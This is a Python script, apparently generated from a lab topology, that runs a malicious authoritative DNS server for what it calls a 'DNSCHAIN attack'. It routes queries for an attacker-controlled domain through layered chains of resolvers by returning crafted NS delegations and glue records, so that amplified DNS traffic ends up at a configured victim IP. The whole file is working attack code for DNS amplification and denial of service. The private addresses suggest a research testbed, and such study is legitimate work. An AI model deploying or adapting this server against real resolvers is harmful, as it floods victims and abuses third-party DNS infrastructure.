from dnslib.server import DNSServer
from dnslib import RR, A, NS, QTYPE, DNSLabel
import random
import time

# --- Configs ---
# Interface
MY_IP = "0.0.0.0"
PORT = 53

# This file is auto-generated by topology_parser.py
# It contains the configuration for the DNSCHAIN attack.

# The domain controlled by the attacker.
MY_DOMAIN = "example.com"

# The final target of the amplified traffic.
VICTIM_IP = "10.66.0.4"

# The routing map that directs DNS queries through the chain of resolvers.
# Key: Source DRS IP (Egress IP of a component)
# Value: List of next-hop DRS IPs (Ingress IPs of the next layer's components)
CHAIN_MAP = {
    "10.66.0.13": ["10.66.0.12", "10.66.0.9"],
    "10.66.0.14": ["10.66.0.4"],
    "10.66.0.15": ["10.66.0.4"],
    "10.66.0.16": ["10.66.0.12", "10.66.0.9"],
    "10.66.0.17": ["10.66.0.10", "10.66.0.11"],
    "10.66.0.18": ["10.66.0.6", "10.66.0.7"],
    "10.66.0.19": ["10.66.0.6", "10.66.0.7"],
    "10.66.0.20": ["10.66.0.10", "10.66.0.11"],
    "default": ["10.66.0.5", "10.66.0.8"],
}


class ChainResolver:
    """
    DNS Chain Resolver
    """

    def resolve(self, request, handler):
        qname = request.q.qname
        qtype = QTYPE[request.q.qtype]
        client_ip = handler.client_address[0]

        # logging
        print(
            f"[{time.strftime('%H:%M:%S')}] Query for '{qname}' ({qtype}) received from: {client_ip}"
        )

        # Subfix
        if not qname.matchSuffix(DNSLabel(MY_DOMAIN)):
            print(f" -> Domain does not match. Refusing.")
            reply = request.reply()
            reply.header.rcode = 5  # REFUSED
            return reply

        # Routing
        next_hops = CHAIN_MAP.get(client_ip, CHAIN_MAP["default"])

        # logging
        if next_hops[0] == VICTIM_IP:
            print(
                f" -> Source is a Level 2 DRS. Delegating to FINAL VICTIM: {VICTIM_IP}"
            )
        else:
            print(f" -> Delegating to next level DRSs: {next_hops}")

        reply = request.reply()

        for i, next_ip in enumerate(next_hops):
            ns_prefix = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
            ns_name = f"{ns_prefix}-{i}.ns.{MY_DOMAIN}"

            reply.add_auth(RR(qname, QTYPE.NS, rdata=NS(ns_name), ttl=60))
            reply.add_ar(RR(ns_name, QTYPE.A, rdata=A(next_ip), ttl=60))

        # Return
        return reply


# --- main ---
if __name__ == "__main__":
    print("=" * 40)
    print("[*] Starting DNSCHAIN Intelligent Auth Server")
    print(f"[*] Controlling domain: *.{MY_DOMAIN}")
    print(f"[*] Final victim IP: {VICTIM_IP}")
    print("[*] Routing Map:")
    for src, dest in CHAIN_MAP.items():
        print(f"    {src} -> {dest}")
    print("=" * 40)

    try:
        resolver = ChainResolver()
        server = DNSServer(resolver, port=PORT, address=MY_IP)
        server.start()
    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        print("\n[*] Server shutting down.")
        if "server" in locals() and server.is_running():
            server.stop()
